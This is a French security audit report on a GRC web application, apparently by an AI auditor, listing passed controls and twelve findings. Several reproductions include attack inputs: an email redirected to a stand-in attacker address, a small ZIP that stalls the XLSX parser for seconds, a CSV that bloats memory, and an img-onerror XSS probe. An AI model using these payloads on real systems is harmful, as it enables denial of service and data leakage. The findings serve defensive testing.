# Rapport de la porte S6

> ⚠️ **Les constats de ce rapport ont été renumérotés de +2 (Q-192…Q-203 → Q-194…Q-205).**
> L'audit et le lot L11 se sont déroulés en parallèle, et deux numérotations ont couru en
> même temps : les numéros **Q-192** et **Q-193** étaient déjà pris au registre — la
> numérotation du catalogue ANSSI, et l'angle mort de `editeur`/`version`. Le registre du
> `PLAN_EXECUTION` §7 est la **seule** source des numéros ; un rapport qui garderait les
> siens en ferait une seconde, et deux listes des mêmes constats divergent en silence.


> **Révision auditée** : `1616e5ee21d64d2b571a13588589fa53a5f28b6e`
> (« L11 : ISO 27002 traduit — 200 chaînes sur 201, 93 clés vérifiées »),
> branche `claude/vague-3-planning-review-6zgbch`.
> ⚠️ **Un agent traduisait en parallèle** dans `cyber-gouvernance_V4/js/data/en/` :
> `ref_nis2.js` a bougé dans l'arbre pendant l'audit (+67/−3). Les constats portant sur
> ce répertoire ont été établis sur la révision **commitée** (`git show 1616e5e:…`) et
> relus contre l'arbre ; ils y subsistent. *« Vert » qualifie une révision, jamais un
> répertoire de travail.*
> **Auditeur** : SECU — n'a écrit aucune des lignes examinées, n'écrit que dans
> `docs/securite/`. Aucun fichier du produit n'a été modifié, aucun commit n'a été fait.
> **Date** : 05/09/2026. **Machine** : `SRV-Infra`, VM Debian 13 réelle, PostgreSQL 17.11,
> Chromium/Playwright réels, Apache 2.4.68 en service.

---

## Verdict global

> ### ❌ **Porte S6 refusée. Quatre contrôles en échec : S13, S18, S10, S3.**
>
> **Le cœur tient, et il tient bien.** `/api/consolidation` — la seule route qui lit
> délibérément plusieurs filiales — **ne fuit rien** : elle ne lit aucune entrée de
> l'appelant, borne sa liste par `f_filiales_lecture()` (le prédicat même des politiques
> RLS) et calcule son total en mémoire depuis les filiales listées, si bien qu'il n'y a
> ni oracle 403/404 à distinguer ni résidu à soustraire. Le `_porteeGroupe` que
> l'orchestrateur m'a demandé de vérifier **n'ouvre effectivement aucun oracle**. Les
> deux rédactions de `charteSession` **ne peuvent pas diverger** : la branche qui
> passerait le second argument est inatteignable en même temps que `POST /api/connexion`.
> L'import de 5 000 lignes est **tout-ou-rien et son rapport dit la vérité** — `creees`
> compte les lignes écrites, jamais les lignes lues. Et le contrôle **S15, jamais rejoué
> depuis quatre portes, passe : `npm audit --omit=dev` → « found 0 vulnerabilities »**.
>
> **Douze constats neufs (Q-194 → Q-205)**, dont **trois de la classe « fuite ou perte de
> données »** et **trois qui bloquent le fonctionnement**.

Sous l'arbitrage du `PLAN_EXECUTION` §0 bis, la porte **trie** :

| Classe | Constats | Traitement |
|---|---|---|
| **Bloque le fonctionnement** | **Q-197**, **Q-198**, **Q-199** | corrigés avant la fin de la vague |
| **Fuite ou perte de données** | **Q-194**, **Q-195**, **Q-196** | corrigés, sans négociation |
| **Tout le reste** | **Q-200** → **Q-205** | marqués `V1.1`, la vague continue |

**Ce que ce verdict dit du produit.** Le lot n'échoue pas sur son cloisonnement — j'ai
cherché la fuite inter-filiales sur la surface qui la rendait probable et je ne l'ai pas
trouvée. Il échoue sur trois choses d'une autre nature :

1. **la sauvegarde du produit ne se restaure pas** — et c'est mesurable sur une base
   vierge portant *un seul* risque saisi à la main ;
2. **deux analyseurs écrits à la main convertissent quelques kilo-octets en minutes de
   serveur bloqué**, sur un produit mono-fil qui sert vingt filiales ;
3. **le lot L12 est livré dans une configuration où il ne peut pas fonctionner**, et le
   banc est vert sur cette configuration-là.

Les trois ont en commun d'être invisibles au banc : **1 655 essais, 1 655 passés,
0 échec** (rejoué le 05/09/2026, `npm test`, 212 s), `npm run verifier-types` propre. Ce
n'est pas le banc qui est mauvais — c'est qu'aucun de ses essais n'a jamais fait passer la
sortie d'une route dans l'entrée de la suivante, ni mesuré ce que coûte un refus.

---

## 1. Ce que j'ai joué

| | |
|---|---|
| Banc du dépôt | `npm test` → **1 655 essais, 1 655 passés, 0 échec** (427 suites, 212 s) ; `npm run verifier-types` sans sortie |
| Contrôle **S15** | `npm audit --omit=dev` → **found 0 vulnerabilities**, code de sortie **0** |
| Sondes propres | **14 fichiers**, écrits dans le scratchpad (jamais sous `backend/test/`, que `npm test` ramasserait), montés sur le **vrai** greffon `greffonApi` + `greffonCycle` avec les vrais crochets `onRequest` |
| Navigateur | Chromium réel, SPA servie telle quelle, `/api/**` relayé vers l'instance Fastify réelle, **avec la CSP lue dans `deploy/apache/cyber-grc.conf`** — jamais recopiée |
| Base | PostgreSQL 17.11, une base neuve migrée par le vrai `db/migrate.mjs` par sonde |
| Machine | `systemctl`, `curl` sur `https://grc.exemple.interne/`, comparaison octet-à-octet des 79 fichiers publiables |

---

## 2. Ce que j'ai éprouvé et qui TIENT

Cette section vaut le reste : sans elle on ne sait pas ce qui est acquis.

| Propriété | Comment je l'ai mesurée | Résultat |
|---|---|---|
| **`/api/consolidation` ne fuit pas** | La route ne lit **ni `query`, ni `params`, ni `body`, ni `headers`** — il n'y a donc rien à demander hors périmètre, et pas de 403/404 à distinguer. `filiales` est bornée par `f_filiales_lecture()`, *le même appel* que les politiques RLS ; `total` est sommé en JS sur les filiales listées, jamais par un `sum` SQL qui aurait ramassé la portée Groupe | **aucune fuite trouvée** |
| **`_porteeGroupe` n'ouvre aucun oracle** | Il vaut `filiale_id is null` sur une ligne **que la session lit déjà**. Il ne nomme aucune filiale et n'apparaît que sur les entités mixtes. Une session d'une filiale n'en apprend rien sur les autres | **l'affirmation de l'orchestrateur est vraie** (mais voir Q-201 : le champ a un autre défaut) |
| **Les deux `charteSession` ne peuvent pas diverger** | La seule branche qui passe le second argument exige `authentificationProvisoire && resolveur instanceof PerimetreProvisoire` — or dans ce mode `POST /api/connexion` **n'existe pas** : mesuré, **404 `ressource_inconnue`**. La divergence est fermée par construction, pas par discipline | **tient** |
| **L'import est tout-ou-rien, et son rapport dit la vérité** | Fichier de 200 lignes, la 138ᵉ sans valeur obligatoire, `appliquer=oui` : **409**, `creees: 0`, `enErreur: 1`, message « aucune donnée n'a été enregistrée », et **`mesure_catalogue` inchangée (3 → 3)**. Le motif historique « 223 sur 250 annoncées en succès » n'est pas reproductible | **tient** |
| **L'import refuse les valeurs énumérées hostiles** | `<img src=x onerror=alert(1)>` en `Statut` : **409**, ligne 2 nommée, **rien en base**. Idem `gravite`, `type`, `priorite` par `POST /api/entites/*` : **400**. Une seule colonne « énumérable » du schéma n'a aucune contrainte (`processus.criticite`) — et son seul site de rendu l'échappe | **tient** |
| **La borne des 5 000 lignes existe** | 5 001 lignes → **400**, message chiffré. (Ce qui ne tient pas est son **coût** : Q-198) | **tient** |
| **La purge RGPD est cloisonnée** | Purge dans A d'un nom présent dans **17 emplacements** : 15 nettoyés, la filiale B **intacte** (`actions.responsable` de B reste nul), la fiche de B **non supprimée**. Purge d'une fiche de B depuis A : **403** ; d'une fiche inexistante : **404** — et une fiche hors périmètre de lecture rend le même 404, donc **pas d'oracle** | **tient** |
| **La sortie de filiale refuse une filiale hors périmètre** | `perimetre.filiales.includes(cible)` avant tout, et le périmètre de la transaction est **le même objet** que celui que lit `chargerJeuDeDonnees` — pas deux copies égales | **tient** |
| **XXE, zip slip, bombe « dégonflée »** | `<!DOCTYPE` et `<!ENTITY` refusés sur les quatre parties lues, aucune bibliothèque XML chargée, noms d'entrées jamais utilisés comme chemins, `inflateRawSync(…, { maxOutputLength })` | **tiennent** (sauf la branche « stockée » : Q-205) |
| **L'export CSV du journal désamorce les formules** | `citer()` appelle `desamorcer()` sur **chaque** colonne, `valeurs_apres` comprise — c'est-à-dire là où une valeur importée atterrit | **tient** |
| **Aucune injection SQL exploitable** | Les seuls identifiants interpolés (`repartition()`, `src/consolidation/index.ts:244`) viennent de sept sites d'appel tous littéraux, dans une fonction non exportée d'une route qui ne lit aucune entrée | **tient** (à durcir : voir §5) |
| **Le repli i18n est bruyant, pas silencieux** | **419 clés FR / 419 EN, 0 manquante dans les deux sens**, `brut()` rend la clé et jamais `undefined` ; langue passée par une liste blanche à deux entrées, aucune construction de chemin | **tient** |
| **S15 — dépendances** | `npm audit --omit=dev` → **0 vulnérabilité**, sortie 0. Le point d'accès `advisories/bulk` répond de nouveau | **le contrôle passe pour la première fois** |

---

## 3. Les constats

### CLASSE « FUITE OU PERTE DE DONNÉES »

---

#### Q-194 — La sauvegarde du produit ne se restaure pas, et l'enveloppe remise à l'acquéreur est illisible

**Classe : perte de données. Contrôle S18 en échec.**

`versLeFrontend()` (`backend/src/entites/index.ts:4609`) rend `""` pour tout `NULL` de la
famille `texte`. `convertirPourLaBase()` (`:4771`) ne reconvertit `""` en `NULL` que si la
colonne n'est pas du texte **ou** si le schéma lui interdit le vide. `risques.catalogue_id`
est du texte, autorise `''`, et porte `fk_risques_catalogue`. Un `NULL` légitime devient
donc `''`, et `''` viole la clé étrangère au retour.

**Reproduction — le chemin exact de l'utilisateur, sur une base vierge :**

```
1. POST /api/entites/risques  {"champs":{"nom":"Rançongiciel sur l'ERP","description":"Saisi à la main"}}
   → 201  { …, "catalogue_id": "" }          (EN BASE : catalogue_id IS NULL)
2. GET  /api/export
   → 200  risques[0].catalogue_id === ""
3. POST /api/reprise  {"mode":"remplacer","fichier":{…l'export de l'étape 2…}}
   → 409 {"erreur":"contrainte_base",
          "message":"Reprise refusée : le fichier renvoie vers un enregistrement qu'il
                     n'apporte pas et qui n'est pas dans vos données…",
          "entite":"risques","identifiant":"RISK-1788580951543-1v1aj0vihgnbo0kg9xw1vm16o"}
   EN BASE, chez le destinataire : 0 risque. Rien n'est restauré.
```

Un produit vierge **plus un seul risque** suffit. Or la migration `012` écrit elle-même
que « **aucun chemin d'écriture existant ne renseigne** » `catalogue_id` : **tout** risque
saisi dans l'interface porte donc `NULL`, et **toute** installation ayant au moins un
risque est concernée dès le premier jour.

**Deux conséquences, et la seconde est irréversible :**

* `POST /api/reprise` en mode **`remplacer`** — la restauration d'une sauvegarde — échoue
  en bloc. Le mode `fusionner` passe (mesuré : 200), pour une raison qui ne protège rien :
  la ligne existe déjà, `catalogue_id` est jugé inchangé, et la colonne est retirée de
  l'`UPDATE`. **La restauration sur une machine neuve — le seul cas où l'on restaure —
  est précisément celle qui échoue.**
* `POST /api/cycle/sortie-filiale` bascule le statut **puis** rend l'enveloppe. Mesuré :
  200, 28 lignes, 22 collections — et cette enveloppe, relue par `/api/reprise` sur
  l'instance de l'acquéreur, rend **409**. La filiale a quitté tous les périmètres, ses
  données ne sont plus lisibles que par le compte propriétaire, et **ce qu'on lui a remis
  ne s'importe pas**. L'opération n'a pas de retour arrière.

**Pourquoi le banc ne le voit pas — et c'est la question 2 de la mission.**
`test/reprise/round-trip.test.mjs` prouve un aller-retour **fichier → charge → fichier**,
en mémoire pure : il n'ouvre aucune base. `test/api/reprise-route.test.mjs` fabrique ses
enveloppes **à la main** (`{ id: 'RISK-APERCU', nom: 'Vu en aperçu seulement' }`), sans
`catalogue_id`. `test/cycle/sortie.test.mjs` compte les identifiants de l'enveloppe et ne
la relit jamais. **Aucun essai du dépôt ne fait passer la sortie de `GET /api/export` (ni
celle de `sortie-filiale`) dans l'entrée de `POST /api/reprise`.** Les deux moitiés sont
éprouvées séparément, avec des données écrites à la main entre les deux : c'est exactement
« un essai vert qui n'a rien eu à mesurer ».

**Rayon exact** : j'ai balayé `pg_catalog` — **une seule** colonne du schéma est à la fois
texte, nullable et porteuse d'une clé étrangère : `risques.catalogue_id → risque_catalogue`.
Le défaut est étroit ; il porte sur le registre des risques et sur les deux chemins de
restauration.

**Ce que le client perd** : sa sauvegarde. Et, le jour d'une cession, l'acquéreur reçoit
un fichier que le produit refuse de relire, alors que l'original a quitté tous les
périmètres.

---

#### Q-195 — Le destinataire d'une relance est départagé par l'ordre physique des lignes, et il bascule

**Classe : fuite de données.**

`resoudreDestinataires()` (`backend/src/notifications/echeances.ts:337`) cherche les
personnes par nom :

```sql
select "nom", "email" from "personnes"
 where lower(btrim("nom")) = any ($1::text[])
   and "email" is not null and btrim("email") <> ''
```

**Aucun `ORDER BY`.** Puis : `if (!par.has(cle)) par.set(cle, …)` — « la première adresse
trouvée gagne ». Or `personnes` est une table **mixte** : `002_metier_noyau.sql:150` la
déclare `filiale_id` nullable, et `pol_personnes_lecture` rend toute ligne de portée
Groupe **à toutes les filiales**. Une fiche de portée Groupe et la fiche locale d'un
homonyme sont donc **toutes deux visibles** depuis une filiale, et rien ne les départage.

**Reproduction, mesurée :**

```
Deux fiches « Marie Dupont » visibles depuis la seule filiale A :
  PERS-GRP  filiale_id=null            rssi.groupe@exemple.interne
  PERS-LOC  filiale_id=FIL-ESSAI-A     marie.dupont@filiale-a.fr

resoudreDestinataires(client, ['Marie Dupont']) sous le périmètre de A :
  choix initial                          → rssi.groupe@exemple.interne
  après « update personnes set notes=… where id='PERS-LOC' »  → rssi.groupe@…  (inchangé)
  après « update personnes set notes=… where id='PERS-GRP' »  → marie.dupont@filiale-a.fr
  ordre physique final (ctid) : PERS-LOC (0,6) puis PERS-GRP (0,7)
```

**Le destinataire du courriel a changé parce que quelqu'un a édité un champ de notes sans
rapport.** Un `VACUUM FULL`, une réécriture de ligne, un changement de plan suffisent.

**Ce que le client perd** : le décompte quotidien des obligations en retard d'une filiale
— dont la ligne « Déclarations d'incident », qui dit à qui la lit que ce site a une
déclaration NIS2/RGPD en souffrance — part vers une personne qui **n'appartient pas à
cette filiale**, un jour sur deux et sans que rien ne le dise. `BilanFiliale` n'enregistre
pas l'adresse retenue. C'est la seule surface du produit qui **sort de la machine**, et
son cadrage par filiale y est décidé par l'ordre physique d'un tas PostgreSQL.

**L'essai qui consacre le défaut — question 3 de la mission.**
`test/notifications/cloisonnement.test.mjs:123` prouve que « l'homonyme reçoit à l'adresse
de SA filiale » en semant **deux homonymes de portée filiale** : un cas que la RLS sépare
déterministiquement, où une seule ligne est jamais visible et où le départage n'est
**jamais consulté**. Le seul cas qui l'exerce — une fiche `filiale_id is null`, la seule
que deux filiales voient ensemble — n'est jamais semé. L'essai lit comme une validation
d'une règle qu'il n'a jamais eu à appliquer.

---

#### Q-196 — Un contributeur repointe l'adresse d'une fiche vers l'extérieur, et le produit y poste les retards de sa filiale

**Classe : fuite de données.**

`CONVENTIONS.md` §36.2 justifie tout le dessin des relances ainsi : *« `personnes.email`
est alimenté par l'AD ; accepter une adresse tapée à la main ferait du produit un relais
de courriel arbitraire. »* **C'est faux dans le produit livré.** Le descripteur de
`personnes` (`backend/src/entites/index.ts:734`) ne réserve que `utilisateur_id` ; `email`
est un champ ordinaire, `DOMAINE_PAR_ENTITE.personnes = 'personnel'`, et le niveau minimal
d'écriture est `contribution`.

**Reproduction, mesurée** — session `contribution`, domaines `['personnel','actions']`,
une seule filiale :

```
PUT /api/entites/personnes/PERS-A  {"version":1,"champs":{"email":"exfiltration@attaquant.example"}}
  → 200 { …, "email": "exfiltration@attaquant.example" }
EN BASE : personnes.email = 'exfiltration@attaquant.example', utilisateur_id = NULL
```

`utilisateur_id` étant nul, la resynchronisation depuis l'AD (`entites/index.ts:1961`) ne
repassera **jamais** sur cette fiche : elle ne corrige que les fiches qui résolvent un
compte réel, à la connexion de ce compte. Une fiche créée à la main pour un prestataire ou
un nom qui ne se connecte pas reste pointée où on l'a mise.

**Ce que le client perd** : à partir du lendemain matin, un produit installé sur site,
accessible par VPN seulement, poste chaque jour vers une adresse externe le détail par
module des obligations en retard d'une filiale. Le journal d'audit enregistre
`destinataires: 1` **sans l'adresse** (`relances.ts:579`) : la fuite est invisible à la
relecture.

---

### CLASSE « BLOQUE LE FONCTIONNEMENT »

---

#### Q-197 — Analyseur XLSX : 1 084 octets bloquent le serveur 8 secondes, 2 kilo-octets le bloquent 30

**Classe : bloque le fonctionnement. Contrôle S13 en échec.**

Quatre expressions rationnelles de `backend/src/import/tableur.ts` ont la forme
`<x …>([\s\S]*?)</x>` — lignes **422** (`<row>`), **440** (`<c>`), **366** (`<si>`),
**352** (`<t>`). Sur une balise **ouverte et jamais refermée**, l'alternative appariée fait
balayer tout le reste de la partie avant d'échouer, et `exec` reprend au `<x` suivant :
**une passe complète par balise ouvrante**, soit O(n²). La borne `LIGNES_MAX` ne mord pas —
elle compte les correspondances `<row>`, et il n'y en a aucune.

**Reproduction, par la route réelle** (`POST /api/import/revues`, multipart, sans même
`appliquer=oui`) : un ZIP d'une seule entrée `xl/worksheets/sheet1.xml` valant
`<?xml version="1.0"?><worksheet><sheetData>` + `'<row r="1">'.repeat(N)`.

| N | fichier envoyé | XML décompressé | réponse | temps |
|---|---|---|---|---|
| 40 000 | **1 084 octets** | 440 067 o | 400 « Ce fichier est vide » | **8 362 ms** |
| 80 000 | ~2 Kio *(même motif, non relevé)* | 880 067 o | 400 | **29 774 ms** |

**Rapport 3,56× pour 2× d'entrée** : la complexité quadratique est confirmée *sur le
chemin du produit*, pas en laboratoire. Extrapolé au plafond de décompression de `zip.ts`
(4 Mio) : de l'ordre de **10 minutes**. Sur la variante `<t>`, ~2×.

**Ce que le client perd** : Node est mono-fil et l'analyse est **synchrone**. Pendant ces
secondes-là, rien d'autre ne s'exécute — ni `/api/sante`, ni la connexion AD, ni le
journal, ni les dix-neuf autres filiales. `ProxyTimeout 60` rend un 504 à l'appelant
**pendant que le serveur continue de calculer** : c'est la figure exacte du constat Q-19.
L'appelant n'a besoin que du droit `ecrire` sur un domaine ; la limitation de rythme
(`src/api/limiteur.ts`) ne crée de compteur que sur un **401**, donc ne voit rien ; et
l'analyse s'exécute **avant** la transaction, sans consommer de connexion du pool ni
d'idempotence — le même envoi se rejoue indéfiniment.

---

#### Q-198 — CSV : la borne des 5 000 lignes tombe après l'analyse, et 4 Mio font 1 Gio de tas

**Classe : bloque le fonctionnement. Contrôle S13 en échec.**

`lireCsv()` (`tableur.ts:221`) construit **toutes** les lignes, `assembler()` (`:570`)
recopie **toute** la grille, et c'est seulement en `assemblerNumerotees` (`:606`) que
`lignes.length > LIGNES_MAX` est jeté.

**Reproduction, par la route réelle** — `POST /api/import/revues`, `fichier` = `"a\n"`
répété 2 000 000 fois (**4 Mio**, un tiers du plafond de corps `12 582 912`) :

```
réponse : 400 « Ce fichier porte 1999999 lignes de données, au-delà des 5000… »  en 2 081 ms
RSS du processus : 144 Mio  →  1 071 Mio
```

**Amplification mesurée ×243** entre l'entrée (3,81 Mio) et le tas (+927 Mio), pour un
fichier refusé.
`deploy/systemd/cyber-grc.service` pose `MemoryHigh=1G` / `MemoryMax=2G` : au plafond de
corps (12 Mio), une **seule** requête franchit le plafond du cgroup. `Restart=on-failure`
relance, et rien ne limite le rythme.

**Ce que le client perd** : le service, redémarré en boucle par un contributeur quelconque
avec un fichier texte. Le commentaire de `LIGNES_MAX` (`tableur.ts:139`) écrit que « le CSV
va jusqu'à 5 000 lignes » — c'est vrai du **résultat**, faux du **travail**. C'est la
définition d'une borne déclarée et non appliquée.

> **L'essai qui ne mesurait rien** : `test/import/lecture.test.mjs:198` éprouve la borne
> avec `LIGNES_MAX + 5` lignes. 5 005 lignes tiennent dans le bruit : il vérifie que le
> refus arrive, jamais ce qu'il coûte.

---

#### Q-199 — L'unité de notification est livrée dans une configuration où elle ne peut pas envoyer, et `install.sh` arme le minuteur sans le vérifier

**Classe : bloque le fonctionnement. Contrôle S18 en échec.**

`deploy/systemd/cyber-grc-notifications.service:98` livre :

```
IPAddressDeny=any
IPAddressAllow=localhost
# ⚠️ À COMPLÉTER À L'INSTALLATION — deux lignes, et le lot ne marche pas sans :
#   IPAddressAllow=<sous-réseau du relais SMTP, ex. 10.0.0.0/8>
```

`deploy/install.sh:1935-1941` installe l'unité **telle quelle** puis
`systemctl enable --now cyber-grc-notifications.timer`. Le seul contrôle de couverture
d'`IPAddressAllow` du dépôt (`install.sh:1802-1903`) lit
`systemctl show -p IPAddressAllow --value **cyber-grc**` — **l'unité applicative**, jamais
celle des notifications — et il ne vérifie que le contrôleur de domaine et les résolveurs
DNS. À la ligne 1883 il écrit même : *« Sans conséquence pour LDAPS, mais le lot L12
(notifications) en aura besoin »*, et il continue. La validation de démarrage
(`install.sh:895`) ne contrôle que le caractère non vide de `SMTP_HOTE`.

**Ce que le client perd** : avec `SMTP_ACTIF=oui` et un relais Office 365 ou un smart-host
— c'est-à-dire la configuration du cadrage —, **chaque envoi est refusé par le noyau**. Le
journal dit « Relais injoignable » et `systemctl status` montre un échec quotidien dont la
cause est dans l'unité, pas dans le réseau. Le lot L12 est livré non fonctionnel.

**Et le banc est vert sur cette configuration-là** : `test/deploiement/deploiement.test.mjs:98`
affirme que `IPAddressAllow=localhost` est présent et que `any` est absent. L'essai valide
exactement l'état qui empêche le lot de marcher — question 3 de la mission.

> ℹ️ Sur `SRV-Infra`, `cyber-grc-notifications.timer` est **`not-found`** : le lot n'a
> jamais été installé ici. Le défaut n'est donc pas *observé* sur cette machine ; il est
> lu dans les deux fichiers que l'installation applique, et le contrôle qui aurait dû
> l'attraper interroge une autre unité.

---

### CLASSE « TOUT LE RESTE » — `V1.1`

---

#### Q-200 — La seule route qui lit tout le groupe ne laisse aucune trace, et l'essai verrouille l'absence

`src/consolidation/index.ts:73` justifie l'absence de trace en citant le §29 :
*« le §29 réserve `consultation_sensible` à la lecture du journal lui-même »*.

**Le motif est faux, et la contradiction est dans le dépôt** : `src/pieces/index.ts:745`
émet déjà `consultation_sensible` pour la délivrance d'une pièce jointe, sur une route
déclarée `action: 'lire'` — et `CONVENTIONS.md` §31.3 (ligne 1915) l'écrit en règle :
*« La route déclare `action: 'lire'`, et **chaque délivrance est tracée** en
`consultation_sensible` »*. Le tableau du §29 (ligne 1581) porte encore la formulation
étroite. **Les deux moitiés de `CONVENTIONS.md` divergent, et le module cite la périmée.**

**Reproduction, mesurée :**

```
5 × GET /api/consolidation  (périmètre Groupe, 2 filiales rendues, indicateurs non vides)
  journal_audit : 2 → 2   (écart 0)
TÉMOIN : 1 × GET /api/export (une seule filiale)
  journal_audit : 2 → 3   (écart 1, action « export »)
```

Le témoin prouve que le journal fonctionnait pendant la mesure.

**Ce que le client perd** : la réponse à *« qui a consulté la posture consolidée du groupe
entier, et quand »* — la question qu'un auditeur ISO 27001 pose à cette surface avant toute
autre. Le parallèle avec `/api/donnees` ne tient pas : celle-ci est cadrée sur **une**
filiale, celle-là rend les volumes, les incidents à déclarer et les retards **des vingt**.

**L'essai consacre le défaut** : `test/api/consolidation.test.mjs:524` asserte que le
compte du journal est **inchangé**, au nom de la règle périmée — et il **échouerait si
quelqu'un ajoutait la trace**. Sa seconde justification est circulaire (« la transaction
est en lecture seule », ce qui est une *conséquence* de la décision de ne pas tracer).
Remède compatible avec le contre-risque Q-122 : ne tracer que si
`session.perimetre.filiales.length > 1` — c'est le prédicat même qui distingue cette route
de `/api/donnees`, et il borne le volume.

---

#### Q-201 — `_porteeGroupe` fait dire au produit « non enregistrés » sur une sauvegarde qui a réussi

`_porteeGroupe` est émis en lecture sur les entités mixtes (`entites/index.ts:3557`), mais
il n'est **pas** dans `CHAMPS_STRUCTURELS` (`:318`), qui ne contient que `_version` et
`_versionMiseEnOeuvre`. Côté navigateur, `extraireVersions()` (`js/core/sync.js:307`)
supprime ces deux-là et **laisse `_porteeGroupe` sur l'enregistrement**. `corpsDe()`
(`:413`) filtre `id`, `updatedAt`, `_version`, `_versionMiseEnOeuvre` — pas lui — et il
tombe donc dans `champsRefuses`.

**Reproduction, dans Chromium réel, contre le serveur réel :**

```
1. ouvrir l'application, attendre la quiescence — aucun bandeau
2. const d = DataStore.getDocuments()[0];   // clés : … "_porteeGroupe" …
   DataStore.updateDocument({...d, titre:'Politique renommée par la sonde'});
3. le PUT part et RÉUSSIT :  PUT /api/entites/documents/DOC-A
4. la page affiche :
   « Champs non reconnus par le serveur, donc non enregistrés :
     documents._porteeGroupe. Signalez-le à votre exploitant. »
```

Quatre entités mixtes sont concernées — mesuré par le bilan d'une reprise :
`documents`, `mesures`, `personnes`, `risque_catalogue`.

**Ce que le client perd** : sur un produit sain, tout enregistrement d'une politique, d'une
mesure, d'une fiche d'annuaire ou d'une entrée du socle de risques déclenche un bandeau
qui affirme que des données **n'ont pas été enregistrées** — alors qu'elles l'ont été — et
qui demande d'alerter l'exploitant. C'est la figure du constat **Q-123** : *un garde-fou
qui accuse le cas nominal s'apprend à être ignoré, et le jour où il accuse pour de vrai,
personne ne l'écoute.* Correctif à un mot : ajouter `CHAMP_PORTEE_GROUPE` à
`CHAMPS_STRUCTURELS` (côté serveur, le champ serait alors ignoré au lieu d'être refusé) —
les deux autres champs structurels y sont déjà, pour exactement cette raison.

---

#### Q-202 — Le mauvais fichier déposé sur « Revues de direction » : 200, « 3 enregistrement(s) ont été créés », trois revues vides dans une preuve d'audit

`revues` est la **seule** entité importable dont **aucune** colonne n'est obligatoire
(`003_metier_operations.sql:669` : `date_revue`, `participants`, `donnees_entree`,
`donnees_sortie` toutes nullables). Le garde-fou « colonne obligatoire absente »
(`moteur.ts:407`) ne peut rien quand il n'y en a aucune ; `champs` reste vide et
`inserer()` écrit `insert into "revues" ("id","filiale_id")`.

**Reproduction, par la route réelle :**

```
POST /api/import/revues?appliquer=oui   fichier = « Nom;Prénom;Service\nDupont;Marie;RH\n… »
  → 200 { "lues":3, "creees":3, "enErreur":0,
          "colonnesInconnues":["Nom","Prénom","Service"],
          "message":"3 enregistrement(s) ont été créés." }
EN BASE : revues 1 → 4, les trois nouvelles avec date_revue, participants,
          donnees_entree, donnees_sortie tous NULL
```

`colonnesInconnues` est bien dans le rapport, mais le **statut** et la **phrase** disent
« réussi ». C'est le cas 1 du tableau du `CLAUDE.md` §3 — *quelque chose réussit en
silence alors que c'est faux*. Piste sans liste écrite à la main : refuser une ligne dont
**aucun** champ n'a été reconnu (`Object.keys(champs).length === 0`), bruyamment, ligne par
ligne.

**Ce que le client perd** : le registre des revues de direction fait preuve en audit
ISO 27001. Un utilisateur qui se trompe de fichier y verse des revues vides et le produit
lui répond que tout s'est bien passé.

---

#### Q-203 — L'i18n a remplacé une table fermée par un passe-plat, et deux `innerHTML` ne l'échappent pas

`I18n.valeur()` (`cyber-gouvernance_V4/js/i18n/index.js:314`) rend **la valeur brute**
quand la clé `valeur.<v>` est absente du dictionnaire, en assumant que *« le produit
accepte des statuts libres à plusieurs endroits »*. `js/modules/conformite.js:29` la met
dans `meta.label`, et les lignes **82** et **157** l'interpolent **sans échappement** :
`<span class="status ${meta.cls}">${meta.label}</span>`.

C'est une **régression du lot** : à `4fe6094^`, `statutMeta` lisait une table close de
littéraux, et `${meta.label}` était sûr *par construction*. `cls` a gardé son repli fermé ;
`label` l'a perdu. Ce sont les **2 seuls sites sur 41** où `I18n.valeur()` n'est ni entouré
d'`escapeHtml` ni passé à `UI.badge`.

**Reproduction, mesurée dans Chromium sous la CSP LUE DANS LE VHOST :**

```
m.statut = '<img src=x id="sonde-s6" onerror="window.__s6=1"
                 style="position:fixed;inset:0;z-index:9999;background:#fff">';
Router.navigateTo('/couverture');

cellule.innerHTML  = <span class="status status-non-evaluee"><img src="x" id="sonde-s6" …></span>
document.getElementById('sonde-s6')  →  l'élément EXISTE
window.__s6 === 1                     →  false   (script-src 'self' a bloqué le gestionnaire)
getComputedStyle(élément).position    →  "fixed" (style-src 'unsafe-inline' l'a appliqué)
```

**Atteignabilité — et c'est ce qui le maintient en classe « le reste ».** J'ai éprouvé les
quatre chemins d'écriture : `POST /api/entites/mesures` → **400**, l'import CSV → **409**,
`POST /api/entites/{incidents,actions}` sur `gravite`/`type`/`priorite` → **400**, et les
`check` du schéma (`ck_mesure_mise_en_oeuvre_statut`, `ck_evaluations_statut`) referment.
Reste le repli de fusion de `js/core/datastore.js:1063`, emprunté quand `/api/reprise`
rend 404/405 — **dormant** tant que la route existe.

**Ce que le client perd** : pas l'exécution de script (la CSP tient), mais la **falsification
de la preuve** : `/soa/:id` est la déclaration d'applicabilité imprimable qui sert de preuve
en audit, et un élément en `position:fixed` y recouvre ce qu'il veut. Correctif : un
`escapeHtml` aux deux lignes — ce que les 39 autres sites font déjà. Et il faut **trancher
le commentaire de `index.js:309`** : si le produit accepte vraiment des statuts libres,
ces deux lignes sont une injection vivante ; sinon le commentaire est faux. Les deux ne
peuvent pas tenir.

---

#### Q-204 — La barrière anti-balise des traductions ne couvre pas les catalogues, que quelqu'un écrit en ce moment

`test/depot/traductions.test.mjs` refuse `[<>]` dans les valeurs de dictionnaire — mais
`chargerDictionnaires` (`:97`) ne lit que `js/i18n/fr.js` et `js/i18n/en.js`. Or
`index.html:131` charge **six catalogues traduits de plus** —
`js/data/en/ref_{anssi,iso27002,iso27001_smsi,nis2,dora,aircyber}.js` — dont les chaînes
remplacent `ref.nom`, `domaine.nom`, `exigence.titre`, `exigence.aide` via
`js/data/referentiels.js`. `traductions-catalogues.test.mjs` les lit, mais ne contrôle que
la couverture chiffrée : **jamais la présence de balises**.

**Ce que le client perd** : la propriété « une traduction ne peut rien ouvrir », que le
§37 revendique, **ne s'applique pas à ~95 % du volume traduit** (ISO 27002 : 201 chaînes ;
AirCyber : 234 questions). Aujourd'hui les sites de rendu de ces champs échappent tous —
la perte est la garantie, pas encore l'exploitation. Mais un agent traduisait
`ref_nis2.js` **pendant cet audit**, et ses dix chaînes sont saines par discipline, pas
par barrière. Le contrôle doit être étendu **avant** que les traducteurs finissent, avec
un plancher de matière (« au moins N chaînes examinées »), sinon il sera vert sur un
répertoire vide.

---

#### Q-205 — Quatre défauts de moindre portée, groupés

| | Où | Quoi | Mesure |
|---|---|---|---|
